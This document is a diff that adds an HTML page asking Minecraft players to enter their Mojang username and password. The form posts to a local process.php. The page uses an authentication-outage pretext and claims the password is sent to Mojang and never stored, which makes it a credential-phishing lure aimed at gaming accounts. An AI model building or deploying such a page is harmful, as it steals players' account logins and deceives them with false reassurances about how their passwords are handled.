@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head lang="en">
+    <meta charset="UTF-8">
+    <title></title>
+</head>
+<div style="width:600px;">
+    <h1>Please verify your minecraft account</h1>
+    <br>
+    Entering your minecraft info here will update the information stored in our servers backup authentication system.
+    <br>
+    No personal information is stored on our servers, if you don't feel safe entering this information, wait until the mojang servers are back online.
+    <body>
+        <form action="process.php" method="post" style="border: 1px double; width: 200px; padding-left: auto;">
+            Mojang User: <input type="text" name="user">
+            <br>
+            Mojang Pass: <input type="password" name="pass">
+            <br>
+            <input type="submit">
+        </form>
+
+    <div>
+        <h3>how it works?</h3>
+        <br>
+        When the server detects Mojangs authentication or session servers are offline, we revert to a cached method of verifying your account.
+        <br>
+        This system effectively updates the cached copy of your username and IP address, or adds them if you've never connected before, allowing you to login even when the Mojang servers are offline.
+        <br>
+        This system DOES NOT store your password or any other irrelevant information, your password is required to verify that the account is actually your own. The information is transmitted to Mojangs servers, your account is verified and the relevant information retrieved is stored (UUID, username) and your session to the website is closed, removing your password from memory.
+    </div>
+</div>
+</body>
+</html>
